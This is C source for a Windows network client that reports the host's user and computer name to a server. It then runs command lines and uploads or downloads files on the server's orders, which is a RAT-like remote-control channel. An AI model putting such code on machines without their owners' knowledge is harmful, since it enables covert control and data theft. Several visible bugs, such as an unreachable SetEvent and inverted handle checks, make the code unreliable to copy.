#include "common.h"
#include "socket.h"
#include "model.h"
#include "batch.h"
#include "postman.h"
#include "transfile.h"
#include <winsock2.h>
#include <windows.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>

//#define fileno(F) ((int)GetStdHandle((F)-(_iob)))

int getServerByHttp(const char *, const char *, const char *);
int initSocket(void);
int uninitSocket(void);
void setConnectionAttrib(const char *address,const unsigned short port);
int socketDataHander(void);
char serverAddress[16];
unsigned short serverPort;
char recvDataBuffer[0x4000];
char sendDataBuffer[0x4000];
int sendDataSize=0;
struct sockaddr_in servAddr;
SOCKET sClient =0;
HANDLE hSynchronizedEvent;
int getServerByHttp(const char *URL, const char *address, const char *port)
{
	return -1;
}

int initSocket(void)//1初始化失败
{
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(2, 2);
	hSynchronizedEvent= CreateEventA(NULL,TRUE,TRUE,NULL);
	if(WSAStartup(sockVersion, &wsaData) != 0)
		return 1;
	servAddr.sin_family = AF_INET;
	return 0;
}
int uninitSocket(void)
{
	closesocket(sClient);
	return WSACleanup();
}

int sendToServer(DataType type, unsigned char *data)
{
	fprintf(stderr, "function: sendToServer(%d, %p)\n", type, data);
	if(type == ToServer_DownloadFileBack) {
		DownloadFeedback *p = (DownloadFeedback *)data;
		//puts("........................");
		fprintf(stderr, ".....................\n");
		fprintf(stderr, "sendToServer: &type = %p\n", &type);
		fprintf(stderr, "sendToServer: flag = %d, &flag = %p\n", p->flag, &p->flag);
		fprintf(stderr, "data = %s\n", p->data);
		//abort();
	}
	int sendDataSize=0;
	WaitForSingleObject(hSynchronizedEvent,INFINITE);
	sendDataSize= modulateData(type, data, sendDataBuffer, sizeof sendDataBuffer);
	return send(sClient,sendDataBuffer,sendDataSize,0);
	SetEvent(hSynchronizedEvent);
}

int connectToServer(void)//1创建失败2连接失败
{
	int ret;
	if(sClient!=INVALID_SOCKET) {
		close(sClient);
		closesocket(sClient);
	}
	sClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sClient == INVALID_SOCKET)
	{
		return 1;
	}
	ret=connect(sClient,(struct sockaddr*)&servAddr,sizeof(servAddr));
	if(ret==SOCKET_ERROR)
	{
		close(sClient);
		closesocket(sClient);
		return 2;
	}
	return 0;
}

void setConnectionAttrib(const char *address,const unsigned short port)
{
	memcpy(serverAddress,address,strlen(address)+1);
	serverPort=port;
	servAddr.sin_port = htons(serverPort);
	servAddr.sin_addr.S_un.S_addr =inet_addr(serverAddress);
}

extern int sendConnectionInfo(void)
{
	ConnectionInfo connInfo;
	unsigned char sendBuff[sizeof(ConnectionInfo)+9+sizeof(int)];
	DWORD len=65;
	strncpy(connInfo.userName,userName,65);
	connInfo.userName[64]=0;
	len=65;
	if(GetComputerNameA(connInfo.computerName,&len))
		connInfo.computerName[len]=0;
	else
		strcpy(connInfo.computerName,"Unknown");
	strcpy(connInfo.key,"Key");//暂时
	strncpy(connInfo.uniqueID,clientUniqueId,16);

	int size=modulateData(ToServer_ConnectionInfo, (const unsigned char *)&connInfo, (char *)sendBuff, sizeof sendBuff);
	/*
	   for(int i=0;i<sizeof(ConnectionInfo)+9+sizeof(int);i++)
	   printf("%hhx,",((char*)&sendBuff)[i]);
	 */
	ConnectionInfo * test;
	test=(ConnectionInfo*)sendBuff+9+4;
	send(sClient, (const char*)sendBuff, size, 0);
	return 0;
}

int socketDataHander(void)
{
	int  dataSize=0;
	while(1)
	{
		int packageSize=0;
		int size;
		size=recv(sClient,(char*)&packageSize,sizeof(int),MSG_PEEK);

		if(size==0 || size==SOCKET_ERROR)break;
		if((size_t)size<sizeof(int))continue;
		recv(sClient,recvDataBuffer,sizeof(int),0);
		dataSize=0;
		int err=0;

		while(dataSize<packageSize)
		{
			size=recv(sClient,recvDataBuffer+dataSize,packageSize-dataSize,0);
			if(size==0 || size==SOCKET_ERROR)
			{
				err=1;
				break;
			}
			dataSize+=size;
		}
		if(err) break;
		write(fileno(stderr), recvDataBuffer, 7);		// HANDLE
		//write(2, recvDataBuffer, 7);				// Index of _iob
		putchar('\n');
		unsigned char *effectiveData;
		DataType type = demodulateData((unsigned char *)recvDataBuffer, dataSize, (void **)&effectiveData);

		fprintf(stderr, "type = %d\n", type);

		switch(type)
		{
			case Type_UnKnow:
				break;
			case ToClient_CommandLine: {
				if(*effectiveData == 0)
					executeCommandLine((const char *)effectiveData + 1);
				else if(*effectiveData == 1)
					terminateCommandLine();
				break;
			}
			case ToClient_Message:
			{
				showNetMessage(effectiveData);
				break;
			}
			case ToClient_UploadFile:
			{
				char flag = *(char *)effectiveData;
				UploadFeedback feedBack;
				char *fileName = (char *)effectiveData + 1;

				switch(flag)
				{
					case TR_Request:
					{
						feedBack.flag=TR_Request;
						feedBack.size= uploadRequest(fileName);
						sendToServer(ToServer_UploadFileBack,(unsigned char*)&feedBack);
						break;
					}
					case TR_Trunc:
					{
						feedBack.flag=TR_Trunc;
						feedBack.size= uploadTrunc(fileName);
						sendToServer(ToServer_UploadFileBack,(unsigned char*)&feedBack);
						break;
					}
					case TR_Append:
					{
						feedBack.flag=TR_Append;
						feedBack.size= uploadAppend(fileName);
						sendToServer(ToServer_UploadFileBack,(unsigned char*)&feedBack);
						break;
					}
					case TR_Data:
					{
						int fileDataSize;
						char *fileData = (char *)effectiveData + 1;
						fileDataSize=dataSize-9-sizeof(char);
						feedBack.flag=TR_Data;
						feedBack.size= uploadSaveData(fileData,fileDataSize);//uploadWritenSize();
						sendToServer(ToServer_UploadFileBack,(unsigned char*)&feedBack);
						Sleep(2);
						break;
					}
					case TR_Terminate:
						uploadTerminate();//terminate
						break;
				}
				break;

			}
			case ToClient_DownloadFile: {
				const char *pathname = (char *)effectiveData;
				if(strcmp(pathname, "TERMINATE") == 0) {
					downloadTerminate();
					break;
				}
				int64_t filesize = downloadRequest(pathname);
				fprintf(stderr, "filesize = %lld\n", filesize);
				DownloadFeedback feedback = { .flag = TR_Request, .size = filesize };
				int s = sendToServer(ToServer_DownloadFileBack, (unsigned char *)&feedback);
				fprintf(stderr, "sendToServer returned: %d\n", s);
				if(filesize == -1) break;
				Sleep(0);
				downloadReadData();
				break;
			}

			case ToClient_SystemInfo:
				break;
			case ToClient_Command_Logoff:
				break;
			case ToClient_Command_Shutdown:
				break;
			case ToClient_Command_Restart:
				break;
			case ToClient_Command_Uninstall:
				break;
			default:
				break;
		}

		//Sleep(10);
	}
	closesocket(sClient);
	if(hSendFile==INVALID_HANDLE_VALUE)
		CloseHandle(hSendFile);
	if(hRecvFile==INVALID_HANDLE_VALUE)
		CloseHandle(hRecvFile);
	hSendFile=INVALID_HANDLE_VALUE;
	hRecvFile=INVALID_HANDLE_VALUE;
	return 0;
}
